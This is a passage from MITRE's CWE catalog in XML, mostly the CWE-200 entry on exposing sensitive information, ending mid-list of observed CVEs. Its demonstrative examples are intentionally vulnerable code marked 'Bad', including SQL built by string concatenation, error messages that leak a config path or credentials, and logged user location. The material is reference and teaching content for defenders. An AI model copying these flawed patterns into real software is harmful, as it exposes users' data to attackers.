               <xhtml:p>Some people use "input validation" as a general term that covers many different neutralization techniques for ensuring that input is appropriate, such as filtering, canonicalization, and escaping. Others use the term in a more narrow context to simply mean "checking if an input conforms to expectations without changing it."  CWE uses this more narrow interpretation.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Input Validation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="200" Name="Exposure of Sensitive Information to an Unauthorized Actor" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information.</Description>
         <Extended_Description>
	   <xhtml:p>There are many different kinds of mistakes that introduce information exposures. The severity of the error can range widely, depending on the context in which the product operates, the type of sensitive information that is revealed, and the benefits it may provide to an attacker.  Some kinds of sensitive information include:</xhtml:p>
       <xhtml:ul>
         <xhtml:li>private, personal information, such as personal messages, financial data, health records, geographic location, or contact details</xhtml:li>
         <xhtml:li>system status and environment, such as the operating system and installed packages</xhtml:li>
		 <xhtml:li>business secrets and intellectual property</xhtml:li>
		 <xhtml:li>network status and configuration</xhtml:li>
		 <xhtml:li>the product's own code or internal state</xhtml:li>
         <xhtml:li>metadata, e.g. logging of connections or message headers</xhtml:li>
		 <xhtml:li>indirect information, such as a discrepancy between two internal operations that can be observed by an outsider</xhtml:li>
       </xhtml:ul>
	    <xhtml:p>Information might be sensitive to different parties, each of which may have their own expectations for whether the information should be protected.  These parties include:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>the product's own users</xhtml:li>
                  <xhtml:li>people or organizations whose information is created or used by the product, even if they are not direct product users</xhtml:li>
		  <xhtml:li>the product's administrators, including the admins of the system(s) and/or networks on which the product operates</xhtml:li>
                  <xhtml:li>the developer</xhtml:li>
               </xhtml:ul>
	    <xhtml:p>Information exposures can occur in different ways:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>the code <xhtml:b>explicitly inserts</xhtml:b> sensitive information into resources or messages that are intentionally made accessible to unauthorized actors, but should not contain the information - i.e., the information should have been "scrubbed" or "sanitized"</xhtml:li>
                  <xhtml:li>a different weakness or mistake <xhtml:b>indirectly inserts</xhtml:b> the sensitive information into resources, such as a web script error revealing the full system path of the program.</xhtml:li>
                  <xhtml:li>the code manages resources that intentionally contain sensitive information, but the resources are <xhtml:b>unintentionally made accessible</xhtml:b> to unauthorized actors. In this case, the information exposure is resultant - i.e., a different weakness enabled the access to the information in the first place.</xhtml:li>
               </xhtml:ul>
	    <xhtml:p>It is common practice to describe any loss of confidentiality as an "information exposure," but this can lead to overuse of CWE-200 in CWE mapping. From the CWE perspective, loss of confidentiality is a technical impact that can arise from dozens of different weaknesses, such as insecure file permissions or out-of-bounds read.  CWE-200 and its lower-level descendants are intended to cover the mistakes that occur in behaviors that explicitly manage, store, transfer, or cleanse sensitive information.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
               <Description>Developers may insert sensitive information that they do not believe, or they might forget to remove the sensitive information after it has been processed</Description>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
               <Description>Separate mistakes or weaknesses could inadvertently make the sensitive information available to an attacker, such as in a detailed error message that can be read by an unauthorized party</Description>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Mobile" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Information Disclosure</Term>
               <Description>This term is frequently used in vulnerability advisories to describe a consequence or technical impact, for any vulnerability that has a loss of confidentiality. Often, CWE-200 can be misused to represent the loss of confidentiality, even when the mistake - i.e., the weakness - is not directly related to the mishandling of the information itself, such as an out-of-bounds read that accesses sensitive memory contents; here, the out-of-bounds read is the primary weakness, not the disclosure of the memory.  In addition, this phrase is also used frequently in policies and legal documents, but it does not refer to any disclosure of security-relevant information.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Information Leak</Term>
               <Description>This is a frequently used term, however the "leak" term has multiple uses within security. In some cases it deals with the accidental exposure of information from a different weakness, but in other cases (such as "memory leak"), this deals with improper tracking of resources, which can lead to exhaustion. As a result, CWE is actively avoiding usage of the "leak" term.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Inter-application Flow Analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Fuzz Tester</xhtml:li>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Attack Modeling</xhtml:li>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-38">
               <Intro_Text>The following code checks validity of the supplied username and password and notifies the user of a successful or failed login.</Intro_Text>
               <Example_Code Nature="Bad" Language="Perl">
                  <xhtml:div>my $username=param('username');
                  <xhtml:br/>my $password=param('password');
                  <xhtml:br/>
                  <xhtml:br/>if (IsValidUsername($username) == 1)
                  <xhtml:br/>{
                  <xhtml:div style="margin-left:1em;">if (IsValidPassword($username, $password) == 1)
                  <xhtml:br/>{
                  <xhtml:div style="margin-left:1em;">print "Login Successful";
                  </xhtml:div>}
                  <xhtml:br/>else
                  <xhtml:br/>{
                  <xhtml:div style="margin-left:1em;">print "Login Failed - incorrect password";
                  </xhtml:div>}
                  </xhtml:div>}
                  <xhtml:br/>else
                  <xhtml:br/>{
                  <xhtml:div style="margin-left:1em;">print "Login Failed - unknown username";
                  </xhtml:div>}
                  </xhtml:div>
               </Example_Code>
               <Body_Text>In the above code, there are different messages for when an incorrect username is supplied, versus when the username is correct but the password is wrong. This difference enables a potential attacker to understand the state of the login function, and could allow an attacker to discover a valid username by trying different values until the incorrect password message is returned. In essence, this makes it easier for an attacker to obtain half of the necessary authentication credentials.</Body_Text>
               <Body_Text>While this type of information may be helpful to a user, it is also useful to a potential attacker. In the above example, the message for both failed cases should be the same, such as:</Body_Text>
               <Example_Code Nature="Result">
                  <xhtml:div>"Login Failed - incorrect username or password"</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-118">
               <Intro_Text>This code tries to open a database connection, and prints any exceptions that occur.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>try {<xhtml:div style="margin-left:1em;">openDbConnection();</xhtml:div>}<xhtml:br/>
                     <xhtml:i>//print exception message that includes exception message and configuration file location</xhtml:i>
                     <xhtml:br/>catch (Exception $e) {<xhtml:div style="margin-left:1em;">echo 'Caught exception: ', $e-&gt;getMessage(), '\n';<xhtml:br/>echo 'Check credentials in config file at: ', $Mysql_config_location, '\n';</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>If an exception occurs, the printed message exposes the location of the configuration file the script is using. An attacker can use this information to target the configuration file (perhaps exploiting a Path Traversal weakness). If the file can be read, the attacker could gain credentials for accessing the database. The attacker may also be able to replace the file with a malicious one, causing the application to use an arbitrary database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-119">
               <Intro_Text>In the example below, the method getUserBankAccount retrieves a bank account object from a database using the supplied username and account number to query the database. If an SQLException is raised when querying the database, an error message is created and output to a log file.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public BankAccount getUserBankAccount(String username, String accountNumber) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>BankAccount userAccount = null;<xhtml:br/>String query = null;<xhtml:br/>try {<xhtml:div style="margin-left:1em;">if (isAuthorizedUser(username)) {<xhtml:div style="margin-left:1em;">query = "SELECT * FROM accounts WHERE owner = "<xhtml:br/>+ username + " AND accountID = " + accountNumber;<xhtml:br/>DatabaseManager dbManager = new DatabaseManager();<xhtml:br/>Connection conn = dbManager.getConnection();<xhtml:br/>Statement stmt = conn.createStatement();<xhtml:br/>ResultSet queryResult = stmt.executeQuery(query);<xhtml:br/>userAccount = (BankAccount)queryResult.getObject(accountNumber);</xhtml:div>}</xhtml:div>} catch (SQLException ex) {<xhtml:div style="margin-left:1em;">String logMessage = "Unable to retrieve account information from database,\nquery: " + query;<xhtml:br/>Logger.getLogger(BankManager.class.getName()).log(Level.SEVERE, logMessage, ex);</xhtml:div>}<xhtml:br/>return userAccount;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The error message that is created includes information about the database query that may contain sensitive information about the database or query logic. In this case, the error message will expose the table name and column names used in the database. This data could be used to simplify other attacks, such as SQL injection (CWE-89) to directly access the database.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-120">
               <Intro_Text>This code stores location information about the current user:</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>currentUser.setLocation(locationClient.getLastLocation());<xhtml:br/>
                     <xhtml:i>...</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>catch (Exception e) {<xhtml:div style="margin-left:1em;">AlertDialog.Builder builder = new AlertDialog.Builder(this);<xhtml:br/>builder.setMessage("Sorry, this application has experienced an error.");<xhtml:br/>AlertDialog alert = builder.create();<xhtml:br/>alert.show();<xhtml:br/>Log.e("ExampleActivity", "Caught exception: " + e + " While on User:" + User.toString());</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>When the application encounters an exception it will write the user object to the log. Because the user object contains location information, the user's location is also written to the log.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-129">
               <Intro_Text>The following is an actual MySQL error statement:</Intro_Text>
               <Example_Code Nature="Result" Language="SQL">
                  <xhtml:div>Warning: mysql_pconnect(): Access denied for user: 'root@localhost' (Using password: N1nj4) in /usr/local/www/wi-data/includes/database.inc on line 4</xhtml:div>
               </Example_Code>
               <Body_Text>The error clearly exposes the database credentials.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-130">
               <Intro_Text>This code displays some information on a web page.</Intro_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>Social Security Number: &lt;%= ssn %&gt;&lt;/br&gt;Credit Card Number: &lt;%= ccn %&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>The code displays a user's credit card and social security numbers, even though they aren't absolutely necessary.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-131">
               <Intro_Text>The following program changes its behavior based on a debug flag.</Intro_Text>
               <Example_Code Nature="Bad" Language="JSP">
                  <xhtml:div>&lt;% if (Boolean.getBoolean("debugEnabled")) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>%&gt;<xhtml:br/>User account number: &lt;%= acctNo %&gt;<xhtml:br/>&lt;%<xhtml:br/>} %&gt;<xhtml:br/>
                        </xhtml:div>
                     </xhtml:div>
                  </xhtml:div>
               </Example_Code>
               <Body_Text>The code writes sensitive debug information to the client browser if the "debugEnabled" flag is set to true .</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-111">
               <Intro_Text>This code uses location to determine the user's current US State location.</Intro_Text>
               <Body_Text>First the application must declare that it requires the ACCESS_FINE_LOCATION permission in the application's manifest.xml:</Body_Text>
               <Example_Code Nature="Bad" Language="XML">
                  <xhtml:div>&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/&gt;</xhtml:div>
               </Example_Code>
               <Body_Text>During execution, a call to getLastLocation() will return a location based on the application's location permissions. In this case the application has permission for the most accurate location possible:</Body_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>locationClient = new LocationClient(this, this, this);<xhtml:br/>locationClient.connect();<xhtml:br/>Location userCurrLocation;<xhtml:br/>userCurrLocation = locationClient.getLastLocation();<xhtml:br/>deriveStateFromCoords(userCurrLocation);</xhtml:div>
               </Example_Code>
               <Body_Text>While the application needs this information, it does not need to use the ACCESS_FINE_LOCATION permission, as the ACCESS_COARSE_LOCATION permission will be sufficient to identify which US state the user is in.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-1483</Reference>
               <Description>Enumeration of valid usernames based on inconsistent responses</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1483</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1528</Reference>
               <Description>Account number enumeration via inconsistent responses.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1528</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2150</Reference>
               <Description>User enumeration via discrepancies in error messages.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2150</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1205</Reference>
               <Description>Telnet protocol allows servers to obtain sensitive environment information from clients.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1205</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1725</Reference>
               <Description>Script calls phpinfo(), revealing system configuration to web user</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1725</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0515</Reference>
               <Description>Product sets a different TTL when a port is being filtered than when it is not being filtered, which allows remote attackers to identify filtered ports by comparing TTLs.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0515</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0778</Reference>
               <Description>Version control system allows remote attackers to determine the existence of arbitrary files and directories via the -X command for an alternate history file, which causes different error messages to be returned.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0778</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-1117</Reference>
               <Description>Virtual machine allows malicious web site operators to determine the existence of files on the client by measuring delays in the execution of the getSystemResource method.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-1117</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0190</Reference>
               <Description>Product immediately sends an error message when a user does not exist, which allows remote attackers to determine valid usernames via a timing attack.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0190</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2049</Reference>
               <Description>POP3 server reveals a password in an error message after multiple APOP commands are sent. Might be resultant from another weakness.</Description>
